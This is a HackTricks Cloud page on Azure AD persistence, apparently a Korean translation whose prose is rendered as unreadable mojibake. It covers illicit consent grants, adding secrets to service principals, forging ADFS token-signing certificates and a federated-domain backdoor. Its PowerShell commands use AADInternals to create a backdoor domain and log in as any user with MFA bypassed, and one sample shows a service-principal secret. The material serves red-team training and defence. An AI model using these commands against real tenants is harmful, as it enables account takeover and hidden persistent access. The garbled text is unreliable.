# Az - Persistence

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

### Illicit Consent Grant

ê¸°ë³¸ì ìœ¼ë¡œ, ëª¨ë“  ì‚¬ìš©ìëŠ” Azure ADì— ì• í”Œë¦¬ì¼€ì´ì…˜ì„ ë“±ë¡í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë”°ë¼ì„œ ê´€ë¦¬ìì˜ ë™ì˜ê°€ í•„ìš”í•œ ë†’ì€ ì˜í–¥ë ¥ì˜ ê¶Œí•œì„ ê°€ì§„ ì• í”Œë¦¬ì¼€ì´ì…˜(ëŒ€ìƒ í…Œë„ŒíŠ¸ ì „ìš©)ì„ ë“±ë¡í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤(ê´€ë¦¬ìë¼ë©´ ìŠ¹ì¸í•  ìˆ˜ ìˆìŒ) - ì˜ˆë¥¼ ë“¤ì–´ ì‚¬ìš©ìë¥¼ ëŒ€ì‹ í•˜ì—¬ ë©”ì¼ì„ ë³´ë‚´ê±°ë‚˜, ì—­í•  ê´€ë¦¬ë¥¼ í•˜ëŠ” ë“±ì˜ ì‘ì—…ì…ë‹ˆë‹¤. ì´ëŠ” ì„±ê³µí•  ê²½ìš° ë§¤ìš° **ê²°ì‹¤ì„ ë§ºì„** ìˆ˜ ìˆëŠ” **í”¼ì‹± ê³µê²©ì„ ì‹¤í–‰**í•  ìˆ˜ ìˆê²Œ í•´ì¤ë‹ˆë‹¤.

ê²Œë‹¤ê°€, ì‚¬ìš©ìê°€ í•´ë‹¹ ì• í”Œë¦¬ì¼€ì´ì…˜ì„ ìˆ˜ë½í•˜ì—¬ ì ‘ê·¼ì„ ìœ ì§€í•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤.

### Applications and Service Principals

ì• í”Œë¦¬ì¼€ì´ì…˜ ê´€ë¦¬ì, GA ë˜ëŠ” microsoft.directory/applications/credentials/update ê¶Œí•œì´ ìˆëŠ” ì‚¬ìš©ì ì •ì˜ ì—­í• ì˜ ê¶Œí•œìœ¼ë¡œ, ê¸°ì¡´ ì• í”Œë¦¬ì¼€ì´ì…˜ì— ìê²© ì¦ëª…(ë¹„ë°€ ë˜ëŠ” ì¸ì¦ì„œ)ì„ ì¶”ê°€í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

**ë†’ì€ ê¶Œí•œì„ ê°€ì§„ ì• í”Œë¦¬ì¼€ì´ì…˜ì„ íƒ€ê²ŸíŒ…**í•˜ê±°ë‚˜ **ë†’ì€ ê¶Œí•œì„ ê°€ì§„ ìƒˆë¡œìš´ ì• í”Œë¦¬ì¼€ì´ì…˜ì„ ì¶”ê°€**í•˜ëŠ” ê²ƒì´ ê°€ëŠ¥í•©ë‹ˆë‹¤.

ì• í”Œë¦¬ì¼€ì´ì…˜ì— ì¶”ê°€í•  í¥ë¯¸ë¡œìš´ ì—­í• ì€ **íŠ¹ê¶Œ ì¸ì¦ ê´€ë¦¬ì ì—­í• **ë¡œ, ì´ëŠ” ì „ì—­ ê´€ë¦¬ìì˜ **ë¹„ë°€ë²ˆí˜¸ë¥¼ ì¬ì„¤ì •**í•  ìˆ˜ ìˆê²Œ í•´ì¤ë‹ˆë‹¤.

ì´ ê¸°ìˆ ì€ ë˜í•œ **MFAë¥¼ ìš°íšŒ**í•  ìˆ˜ ìˆê²Œ í•´ì¤ë‹ˆë‹¤.

{% code overflow="wrap" %}
```powershell
$passwd = ConvertTo-SecureString "J~Q~QMt_qe4uDzg53MDD_jrj_Q3P.changed" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential("311bf843-cc8b-459c-be24-6ed908458623", $passwd)
Connect-AzAccount -ServicePrincipal -Credential $credentials -Tenant e12984235-1035-452e-bd32-ab4d72639a
```
{% endcode %}

* ì¸ì¦ì„œ ê¸°ë°˜ ì¸ì¦ì„ ìœ„í•œ

{% code overflow="wrap" %}
```powershell
Connect-AzAccount -ServicePrincipal -Tenant <TenantId> -CertificateThumbprint <Thumbprint> -ApplicationId <ApplicationId>
```
{% endcode %}

### Federation - Token Signing Certificate

**DA ê¶Œí•œ**ìœ¼ë¡œ ì˜¨í”„ë ˆë¯¸ìŠ¤ ADì—ì„œ **ìƒˆë¡œìš´ Token signing** ë° **Token Decrypt certificates**ë¥¼ ìƒì„±í•˜ê³  ê°€ì ¸ì˜¬ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ ì¸ì¦ì„œëŠ” ë§¤ìš° ê¸´ ìœ íš¨ ê¸°ê°„ì„ ê°€ì§‘ë‹ˆë‹¤. ì´ë¥¼ í†µí•´ ìš°ë¦¬ê°€ ì•„ëŠ” ImuutableIDë¥¼ ê°€ì§„ **ëª¨ë“  ì‚¬ìš©ìë¡œ ë¡œê·¸ì¸**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

**ADFS ì„œë²„ì—ì„œ DAë¡œ** ì•„ë˜ ëª…ë ¹ì„ ì‹¤í–‰í•˜ì—¬ ìƒˆë¡œìš´ ì¸ì¦ì„œë¥¼ ìƒì„±í•˜ê³  (ê¸°ë³¸ ë¹„ë°€ë²ˆí˜¸ 'AADInternals'), ì´ë¥¼ ADFSì— ì¶”ê°€í•˜ê³ , ìë™ ë¡¤ì˜¤ë²„ë¥¼ ë¹„í™œì„±í™”í•˜ê³ , ì„œë¹„ìŠ¤ë¥¼ ì¬ì‹œì‘í•©ë‹ˆë‹¤:
```powershell
New-AADIntADFSSelfSignedCertificates
```
ê·¸ëŸ° ë‹¤ìŒ Azure ADë¡œ ì¸ì¦ì„œ ì •ë³´ë¥¼ ì—…ë°ì´íŠ¸í•©ë‹ˆë‹¤:
```powershell
Update-AADIntADFSFederationSettings -Domain cyberranges.io
```
### Federation - Trusted Domain

GA ê¶Œí•œì´ ìˆëŠ” í…Œë„ŒíŠ¸ì—ì„œ **ìƒˆ ë„ë©”ì¸ ì¶”ê°€** (ê²€ì¦ë˜ì–´ì•¼ í•¨), ì¸ì¦ ìœ í˜•ì„ Federatedë¡œ êµ¬ì„±í•˜ê³  ë„ë©”ì¸ì„ **íŠ¹ì • ì¸ì¦ì„œ** (ì•„ë˜ ëª…ë ¹ì˜ any.sts) ë° ë°œê¸‰ìë¥¼ ì‹ ë¢°í•˜ë„ë¡ êµ¬ì„±í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```powershell
# Using AADInternals
ConvertTo-AADIntBackdoor -DomainName cyberranges.io

# Get ImmutableID of the user that we want to impersonate. Using Msol module
Get-MsolUser | select userPrincipalName,ImmutableID

# Access any cloud app as the user
Open-AADIntOffice365Portal -ImmutableID qIMPTm2Q3kimHgg4KQyveA== -Issuer "http://any.sts/B231A11F" -UseBuiltInCertificate -ByPassMFA$true
```
## References

* [https://aadinternalsbackdoor.azurewebsites.net/](https://aadinternalsbackdoor.azurewebsites.net/)

{% hint style="success" %}
AWS í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°:<img src="../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">\
GCP í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°: <img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks ì§€ì›í•˜ê¸°</summary>

* [**êµ¬ë… ê³„íš**](https://github.com/sponsors/carlospolop) í™•ì¸í•˜ê¸°!
* **ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— ì°¸ì—¬í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ë¥¼ íŒ”ë¡œìš°í•˜ì„¸ìš”.**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) ê¹ƒí—ˆë¸Œ ë¦¬í¬ì§€í† ë¦¬ì— PRì„ ì œì¶œí•˜ì—¬ í•´í‚¹ íŒì„ ê³µìœ í•˜ì„¸ìš”.**

</details>
{% endhint %}
